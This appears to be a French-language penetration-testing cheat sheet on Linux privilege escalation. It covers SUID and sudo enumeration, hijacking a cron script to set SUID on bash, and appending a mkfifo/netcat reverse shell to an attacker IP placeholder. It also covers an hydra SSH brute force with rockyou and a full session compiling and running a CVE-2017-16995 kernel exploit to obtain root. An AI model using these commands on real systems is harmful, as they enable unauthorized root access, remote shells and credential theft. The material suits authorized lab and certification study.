
```bash
linpeas.sh direct après accès initial

sudo -l into gtfobins

find / -perm -4000 -type f 2>/dev/null  (suid)
find / -perm -2000 -type f 2>/dev/null  (guid)

crontab -l ou sudo crontab -l
echo "chmod +s /bin/bash" >> /home/user/script_du_cron.sh
attendre une min 
/bin/bash -p

ou
(pc cible)
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip_hacker> 1234 >/tmp/f" >> /home/user/script_du_cron.sh

(pc hacker)
nc -lnvp 1234
#

si deuxième user trouvé dans /home ou alors root
hydra -l 2user -P /usr/share/rockyou.txt  <ip> -t 4 ssh -V
```

####  Exploiting Kernel Vulnerabilities

```bash
joe@ubuntu-privesc:~$ cat /etc/issue
Ubuntu 16.04.4 LTS \n \l


joe@ubuntu-privesc:~$ uname -r 
4.4.0-116-generic

joe@ubuntu-privesc:~$ arch 
x86_64


kali@kali:~$ searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"


Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation      | linux/local/45010.c


kali@kali:~$ cp /usr/share/exploitdb/exploits/linux/local/45010.c .

kali@kali:~$ head 45010.c -n 20


kali@kali:~$ head 45010.c -n 20

/*
  Credit @bleidl, this is a slight modification to his original POC
  https://github.com/brl/grlh/blob/master/get-rekt-linux-hardened.c

  For details on how the exploit works, please visit
  https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html

  Tested on Ubuntu 16.04 with the following Kernels
  4.4.0-31-generic
  4.4.0-62-generic
  4.4.0-81-generic
  4.4.0-116-generic
  4.8.0-58-generic
  4.10.0.42-generic
  4.13.0-21-generic

  Tested on Fedora 27
  4.13.9-300
  gcc cve-2017-16995.c -o cve-2017-16995
  internet@client:~/cve-2017-16995$ ./cve-2017-16995
  
  
kali@hacker:~$ scp cve-2017-16995.c cible@192.168.123.216:
  
cible@ubuntu-privesc:~$ gcc cve-2017-16995.c -o cve-2017-16995
 
cible@ubuntu-privesc:~$ ./cve-2017-16995
 ...
 # id
uid=0(root) gid=0(root) groups=0(root),1001(joe)
```

 
```

```

#### Exposed Confidential Information (leak de mdp)

```bash
env
...
XDG_SESSION_CLASS=user
TERM=xterm-256color
SCRIPT_CREDENTIALS=lab          <-- leak de creds
USER=joe
LC_TERMINAL_VERSION=3.4.16
SHLVL=1
XDG_SESSION_ID=35
LC_CTYPE=UTF-8
XDG_RUNTIME_DIR=/run/user/1000
SSH_CLIENT=192.168.118.2 59808 22
PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
MAIL=/var/mail/joe
SSH_TTY=/dev/pts/1
OLDPWD=/home/joe/.cache


cat .bashrc

# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

# don't put duplicate lines or lines starting with space in the history.
# See bash(1) for more options
export SCRIPT_CREDENTIALS="lab"    <-- leak de creds
HISTCONTROL=ignoreboth
```


https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/